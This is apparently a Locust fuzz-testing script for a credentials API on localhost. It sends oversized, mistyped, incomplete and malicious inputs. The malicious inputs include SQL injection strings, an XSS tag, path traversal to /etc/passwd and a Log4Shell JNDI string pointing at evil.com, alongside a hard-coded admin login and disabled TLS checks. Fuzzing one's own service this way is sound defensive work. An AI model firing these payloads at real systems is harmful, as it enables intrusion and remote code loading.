import os
import csv
import json
import random
import logging
import uuid
import string
from locust import HttpUser, task, SequentialTaskSet, constant, events

stat_file = open('/tmp/credentials_fuzz_stats.csv', 'w')
log = logging.getLogger(__name__)

class CredentialsFuzzingScenario(SequentialTaskSet):
    stat_file = None

    @events.init_command_line_parser.add_listener
    def _collect_(parser):
        parser.add_argument("--stat_file", type=str, env_var="LOCUST_MY_ARGUMENT", default="", help="stat file name")
        args = parser.parse_args()

    @events.test_start.add_listener
    def _(environment, **kw):
        log.info(f"Custom argument supplied: {environment.parsed_options.stat_file}")
        CredentialsFuzzingScenario.stat_file = environment.parsed_options.stat_file

    @events.request.add_listener
    def my_request_handler(request_type, name, response_time, response_length, response,
                           exception, *args, **kwargs):
        if exception:
            log.info(f"Request to {name} failed with exception {exception}")
        else:
            log.info(f"Successfully made a request to: {name}")
            log.info(f"The response was {response.text}")
            filename = CredentialsFuzzingScenario.stat_file
            with open(filename, 'a', newline='') as csv_file:
                writer = csv.writer(csv_file)
                writer.writerow([name, request_type, response_time, response_length])

    @events.request_failure.add_listener
    def my_request_failure(request_type, name, response_time, response_length, **kw):
        stat_file.write(request_type + ";" + name + ";" + str(response_time) + ";" + str(response_length) + "\n")

    @events.quitting.add_listener
    def hook_quitting(environment, **kw):
        stat_file.close()

    def generate_oversized_string(self, length=10000):
        """Generate oversized strings for buffer overflow testing"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def generate_special_chars(self):
        """Generate strings with special characters for injection testing"""
        special_payloads = [
            "'; DROP TABLE credentials; --",
            "<script>alert('XSS')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "%0A%0D",
            "\x00\x01\x02\x03",
            "admin'/*",
            "1' OR '1'='1",
            "../../../windows/system32/drivers/etc/hosts"
        ]
        return random.choice(special_payloads)

    def generate_invalid_types(self):
        """Generate payloads with wrong data types"""
        return [
            {"name": 123, "username": "test", "password": "test", "type": "OS"},
            {"name": [], "username": "test", "password": "test", "type": "OS"},
            {"name": None, "username": "test", "password": "test", "type": "OS"},
            {"name": {}, "username": "test", "password": "test", "type": "OS"},
            {"name": "test", "username": 456, "password": "test", "type": "OS"},
            {"name": "test", "username": "test", "password": [], "type": "OS"},
            {"name": "test", "username": "test", "password": "test", "type": 789}
        ]

    def on_start(self):
        """Authenticate and get token"""
        payload = {
            "username": "admin",
            "password": "admin123"
        }
        response = self.client.post("/api/v3/login",
                                    json=payload,
                                    verify=False,
                                    catch_response=True)
        if response.status_code == 200:
            token_json = response.json()
            self.token = token_json["access_token"]
            log.debug("self.token={}".format(self.token))
        else:
            self.token = "fake_token_for_testing"
        return self.token

    @task(3)
    def fuzz_create_credential_oversized_fields(self):
        """Test credential creation with oversized fields"""
        headers = {"Authorization": f"Bearer {self.token}"}

        fuzz_payloads = [
            # Oversized name
            {
                "name": self.generate_oversized_string(5000),
                "username": "testuser",
                "password": "testpass",
                "type": "OS"
            },
            # Oversized username
            {
                "name": "test_cred",
                "username": self.generate_oversized_string(3000),
                "password": "testpass",
                "type": "OS"
            },
            # Oversized password
            {
                "name": "test_cred",
                "username": "testuser",
                "password": self.generate_oversized_string(8000),
                "type": "OS"
            }
        ]

        for payload in fuzz_payloads:
            with self.client.post("/api/v3/raw-credentials",
                                  headers=headers,
                                  json=payload,
                                  verify=False,
                                  catch_response=True) as response:

                log.info(f"Oversized field test - Status: {response.status_code}")
                if response.status_code in [400, 413, 422]:
                    response.success()  # Expected behavior for oversized data
                elif response.status_code == 401:
                    log.info("Authentication required")
                    response.success()

    @task(3)
    def fuzz_create_credential_special_chars(self):
        """Test credential creation with special characters"""
        headers = {"Authorization": f"Bearer {self.token}"}

        payload = {
            "name": self.generate_special_chars(),
            "username": self.generate_special_chars(),
            "password": self.generate_special_chars(),
            "type": "OS"
        }

        with self.client.post("/api/v3/raw-credentials",
                              headers=headers,
                              json=payload,
                              verify=False,
                              catch_response=True) as response:

            log.info(f"Special chars test - Status: {response.status_code}")
            if response.status_code in [400, 422, 500]:
                response.success()  # Expected behavior for malicious input
            elif response.status_code == 401:
                response.success()

    @task(2)
    def fuzz_create_credential_invalid_types(self):
        """Test credential creation with invalid data types"""
        headers = {"Authorization": f"Bearer {self.token}"}

        invalid_payloads = self.generate_invalid_types()

        for payload in invalid_payloads:
            with self.client.post("/api/v3/raw-credentials",
                                  headers=headers,
                                  json=payload,
                                  verify=False,
                                  catch_response=True) as response:

                log.info(f"Invalid type test - Status: {response.status_code}")
                if response.status_code in [400, 422]:
                    response.success()  # Expected behavior for wrong types
                elif response.status_code == 401:
                    response.success()

    @task(2)
    def fuzz_create_credential_missing_required_fields(self):
        """Test credential creation with missing required fields"""
        headers = {"Authorization": f"Bearer {self.token}"}

        incomplete_payloads = [
            {"username": "test", "password": "test", "type": "OS"},  # Missing name
            {"name": "test", "password": "test", "type": "OS"},      # Missing username
            {"name": "test", "username": "test", "type": "OS"},     # Missing password
            {"name": "test", "username": "test", "password": "test"}, # Missing type
            {},  # Empty payload
            {"name": "", "username": "", "password": "", "type": ""}  # Empty strings
        ]

        for payload in incomplete_payloads:
            with self.client.post("/api/v3/raw-credentials",
                                  headers=headers,
                                  json=payload,
                                  verify=False,
                                  catch_response=True) as response:

                log.info(f"Missing fields test - Status: {response.status_code}")
                if response.status_code in [400, 422]:
                    response.success()  # Expected behavior for missing fields
                elif response.status_code == 401:
                    response.success()

    @task(1)
    def fuzz_get_credentials_invalid_params(self):
        """Test GET credentials with malicious query parameters"""
        headers = {"Authorization": f"Bearer {self.token}"}

        malicious_params = [
            {"filter": "'; DROP TABLE credentials; --"},
            {"orderby": "<script>alert('xss')</script>"},
            {"page": -1},
            {"pageSize": 999999},
            {"page": "not_a_number"},
            {"pageSize": "invalid"},
            {"filter": self.generate_oversized_string(2000)}
        ]

        for params in malicious_params:
            with self.client.get("/api/v3/raw-credentials",
                                 headers=headers,
                                 params=params,
                                 verify=False,
                                 catch_response=True) as response:

                log.info(f"Invalid params test - Status: {response.status_code}")
                if response.status_code in [400, 422, 500]:
                    response.success()  # Expected behavior for malicious params
                elif response.status_code == 401:
                    response.success()
                elif response.status_code == 200:
                    response.success()  # Some params might be ignored

    @task(1)
    def fuzz_credential_operations_invalid_ids(self):
        """Test credential operations with invalid IDs"""
        headers = {"Authorization": f"Bearer {self.token}"}

        invalid_ids = [
            "'; DROP TABLE credentials; --",
            "../../../etc/passwd",
            "00000000-0000-0000-0000-000000000000",
            "not-a-uuid",
            self.generate_oversized_string(1000),
            "",
            "null",
            "undefined"
        ]

        for invalid_id in invalid_ids:
            # Test GET by ID
            with self.client.get(f"/api/v3/raw-credentials/{invalid_id}",
                                 headers=headers,
                                 verify=False,
                                 catch_response=True) as response:

                log.info(f"Invalid ID GET test - Status: {response.status_code}")
                if response.status_code in [400, 404, 422]:
                    response.success()
                elif response.status_code == 401:
                    response.success()

            # Test DELETE by ID
            with self.client.delete(f"/api/v3/raw-credentials/{invalid_id}",
                                    headers=headers,
                                    verify=False,
                                    catch_response=True) as response:

                log.info(f"Invalid ID DELETE test - Status: {response.status_code}")
                if response.status_code in [400, 404, 422]:
                    response.success()
                elif response.status_code == 401:
                    response.success()


class CredentialsFuzzUser(HttpUser):
    wait_time = constant(1)
    tasks = [CredentialsFuzzingScenario]
    host = "https://localhost:8443"
